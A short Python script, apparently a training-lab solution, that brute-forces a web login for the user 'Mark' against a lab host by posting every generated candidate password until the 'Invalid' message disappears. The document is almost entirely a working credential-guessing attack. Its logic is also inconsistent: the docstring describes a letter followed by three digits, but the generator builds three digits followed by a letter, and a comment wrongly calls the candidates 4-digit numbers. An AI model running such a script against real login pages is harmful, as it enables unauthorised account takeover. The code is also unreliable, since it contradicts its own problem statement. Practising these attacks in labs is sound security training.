'''
Problem: brute force a web app login 
the username has been discovered to be 'Mark'
the password is known to be a four character string
the first character of the string is an uppercase letter
the last three characters are numbers between 000-999
'''

import requests
import string

url = "http://python.thm/labs/lab1/index.php"
username = 'Mark'

# Generate list of 4-digit numeric 'passwords'
password_list = (f"{str(i).zfill(3)}{char}" for i in range(1000) for char in string.ascii_uppercase)

def brute_force():
    for password in password_list:
            data = {"username":username,"password":password} # note that data fields must match the name of the field on the target
            response = requests.post(url, data=data) # method must match the method required by the target

            if "Invalid" not in response.text:
                    print(f"[+] Found valid credentials: {username}:{password}")
                    break   
            else:
                    print(f"[-] Attempted: {password}")

if __name__ == '__main__':
    brute_force()